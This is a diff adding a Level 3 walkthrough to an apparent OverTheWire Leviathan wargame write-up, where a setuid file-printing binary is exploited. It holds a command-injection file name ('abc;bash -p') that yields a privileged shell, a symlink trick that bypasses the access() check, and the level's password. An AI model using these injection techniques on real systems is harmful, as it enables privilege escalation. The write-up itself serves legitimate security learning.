@@ -109,7 +109,131 @@ Password: NsN1HwFoyN
 ---
 
 #### Level 3
+This time, the root directory has a setuid binary file `printfile`.
 
+Running this gives some background info on how it works:
+
+```bash
+leviathan2@gibson:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+```
+
+You can try it with a file that leviathan2 has access to, let's say `.bash_logout`:
+
+```bash
+leviathan2@gibson:~$ ./printfile .bash_logout
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+```
+
+It prints the contents of the file.
+
+You might think to try using the executable to print the password file located in `/etc/leviathan_pass/leviathan3`:
+
+```bash
+leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+```
+
+But alas, it is not easy as it seems.
+
+Again, you can make use of `ltrace` to see the inner workings of the program:
+
+```bash
+leviathan2@gibson:~$ ltrace ./printfile .bash_logout
+__libc_start_main(0x80490ed, 2, 0xffffd474, 0 <unfinished ...>
+access(".bash_logout", 4)                   = 0
+snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
+geteuid()                                   = 12002
+geteuid()                                   = 12002
+setreuid(12002, 12002)                      = 0
+system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                      = 0
++++ exited (status 0) +++
+```
+
+You can see that it first checks whether the real user ID has permissions (leviathan2, not leviathan3) to access the file with the [access()](https://man7.org/linux/man-pages/man2/access.2.html) command. It then concatenates `/bin/cat` with the file as a string. At the end, `system()` executes that string.
+
+Based on this, it can be deduced that the reason why you cannot simply access `/etc/leviathan_pass/leviathan3` is because it fails the very first check from `access()`.
+
+So, as long as you can bypass the first check, `system()` will run with the permissions of leviathan3.
+
+There are a multitude of ways you can solve this, here are two:
+
+##### Approach #1 (Courtesy of [rtmoran](https://rtmoran.org/overthewire-leviathan-level-2/))
+Create a temporary directory and make sure to change the permissions so it can be accessed by the executable.
+
+Next, you can exploit the way `snprintf()` concatenates and passes on a string to `system()` by creating a new file called `abc;bash -p`.
+
+> Note that bash commands are separated using `;` or `&&`.
+
+If you now run the binary executable with the newly created file:
+
+```bash
+leviathan2@gibson:/tmp/tmp.8pA9XQ2qoU$ ~/./printfile abc\;bash\ -p
+/bin/cat: abc: No such file or directory
+leviathan3@gibson:/tmp/tmp.8pA9XQ2qoU$ whoami
+leviathan3
+```
+
+It passes the `access()` check, and then the file is concatenated with `/bin/cat` and passed onto `system()`. This then attempts to execute `/bin/cat abc` first, but fails because there is no such file, then executes `bash -p` with the `-p` retaining the permissions of the effective user (leviathan3).
+
+Again, now that you have a running shell as leviathan3, it is as easy as reading the password from `/etc/leviathan_pass/leviathan3`.
+
+##### Approach #2 (Courtesy of [MayADevBe](https://mayadevbe.me/posts/overthewire/leviathan/level3/))
+Create a temporary directory and change the permissions so it can be accessed by the executable.
+
+One way to find exploits/vulnerabilities is to test all possible inputs to the program and observe the result.
+
+For example, what if we have a file with a space?
+
+```bash
+leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ touch "example file.txt"
+leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ltrace ~/./printfile "example file.txt"
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("example file.txt", 4)               = 0
+snprintf("/bin/cat example file.txt", 511, "/bin/cat %s", "example file.txt") = 25
+geteuid()                                   = 12002
+geteuid()                                   = 12002
+setreuid(12002, 12002)                      = 0
+system("/bin/cat example file.txt"/bin/cat: example: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                      = 256
++++ exited (status 0) +++
+```
+
+What you find is that the program uses the full file name to determine if the real user has permission to access the file, but the `system()` only runs for the first part of the filename "example".
+
+You can exploit this by creating a new file with the name "example" that links to `/etc/leviathan_pass/leviathan3`. Read more about [links](https://www.linux.com/topic/desktop/understanding-linux-links/). By usual means you would not be able to access the password with the file but the binary executable runs effectively as leviathan3 after passing the `access()` so with this you have a loophole.
+
+```bash
+leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ln -s /etc/leviathan_pass/leviathan3 example
+leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ls
+example  example file.txt
+leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ~/./printfile "example file.txt"
+f0n8h2iWLP
+/bin/cat: file.txt: No such file or directory
+```
+
+The executable bypasses the `access()` check because it reads the full file "example file.txt" and confirms that the real user (leviathan2) has permissions to access the file. It then proceeds to execute `/bin/cat example` after changing the effective user ID to leviathan3, making it possible to read the password.
+
+Password: f0n8h2iWLP
 
 ---
 
